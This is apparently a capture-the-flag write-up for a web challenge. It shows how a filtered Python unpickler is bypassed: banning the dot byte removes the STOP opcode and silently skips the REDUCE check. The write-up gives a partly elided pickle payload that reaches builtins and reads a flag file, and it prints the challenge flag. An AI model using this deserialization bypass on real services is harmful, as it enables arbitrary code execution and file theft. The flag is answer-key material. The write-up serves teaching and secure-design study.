# pickle ("timecapsule") — Web (Easy)

**Flag:** `pwnsec{62b2162690e5f26c}`

## Target
`POST /restore` takes base64, and unpickles it behind three filters:

```python
BANNED_PATTERNS = [b".", b"os", b"system", b"popen", b"subprocess", b"commands",
                   b"exec", b"eval", b"import", b"getattr", b"setattr", b"flag"]
BANNED_INSTRUCTION = "REDUCE"
ALLOWED_MODULES = {"sessionstore", "collections"}
```

`RestrictedUnpickler.find_class` enforces the module allowlist; `check()` rejects any
banned byte sequence and any pickle whose `pickletools.dis()` output mentions `REDUCE`.
Unpickling runs under `contextlib.redirect_stdout(buf)` and `buf.getvalue()` is returned
as `output`, while unpickling exceptions are swallowed with `except Exception: pass`.

## The contradiction that breaks it
`b"."` is banned — and the pickle **STOP** opcode *is* `b"."` (0x2e). So no terminated
pickle can ever be submitted. That looks like a wall, but it is the key:

```python
try:
    pickletools.dis(data, out=out)
    disassembled = out.getvalue()
    if BANNED_INSTRUCTION in disassembled: raise ValueError(...)
except Exception:
    disassembled = "Error!"      # <-- REDUCE check silently skipped
```

`pickletools.dis` raises on a pickle with no STOP, so the `except` swallows it and
`disassembled` becomes `"Error!"`. **The dot ban forces exactly the condition that
disables the REDUCE ban.** And because `load()`'s own EOF error is swallowed too, every
opcode before the truncation still executes, with stdout captured and returned. So
arbitrary `REDUCE` calls are available — the filter list reads as restrictive but
forbids nothing that matters.

A successful request is recognisable by `"disassembled": "Error!"`.

## Reaching useful callables under the module allowlist
Only `sessionstore` and `collections` may be named, and `find_class` forbids dotted
names anyway (dots are banned bytes). Two entries in `collections`' own namespace are
enough:

* **`collections.__builtins__`** — in any non-`__main__` module this is the builtins
  **dict**, so the whole builtins namespace is one allowed `GLOBAL` away.
* **`collections._itemgetter`** — `collections/__init__.py` does
  `from operator import itemgetter as _itemgetter`, giving a dict-subscript primitive.

`itemgetter(name)(builtins_dict)` then yields any builtin whose name survives the
substring ban. `print`, `open`, `tuple` and `bytes` all do. (`eval`, `exec` and
`__import__` do not — but they are not needed.)

## Naming a file that cannot be named
`/app/flag.txt` contains both `.` and `flag`, so the path can never appear literally.
`open()` accepts a **bytes** path, and a bytes object can be built from integers, whose
decimal `INT` opcodes contain neither banned sequence:

```
bytes([47,97,112,112,47,102,108,97,103,46,116,120,116])   # "/app/flag.txt"
```

Finally, `REDUCE` calls `func(*args)`, so `tuple(fileobj)` splits the file into lines and
one more `REDUCE` applies `print` to them:

```
lines = tuple(open(bytes([...])))
print(*lines)
```

## Payload
247 bytes, no `0x2e`, no STOP:

```
ccollections\n__builtins__\np0\nccollections\n_itemgetter\np1\n
g1\n(Vprint\ntR(g0\ntRp2\n   ... (open -> p3, tuple -> p4, bytes -> p5)
g5\n(](I47\nI97\n...e tRp6\n     # path bytes
g3\n(g6\ntRp7\n                  # open(path)
g4\n(g7\ntRp8\n                  # tuple(f)
g2\ng8\nR                        # print(*lines)
```

```
$ python3 solve.py https://<instance>
ok: True | disassembled: 'Error!'
output: pwnsec{62b2162690e5f26c}
```

## Lesson
A denylist whose entries *interact* is more dangerous than a short one: banning `b"."`
did not merely block dotted module paths, it made every submitted pickle unterminated,
which routed `pickletools.dis` into a bare `except` and voided the one check
(`REDUCE`) that actually mattered. Two secondary habits did the rest — swallowing
unpickling errors while still returning captured stdout turns a crash into an exfil
channel, and a module allowlist is only as narrow as its members' namespaces:
`collections` carries `__builtins__` and a re-exported `operator.itemgetter`, so
"two modules" was really all of builtins.
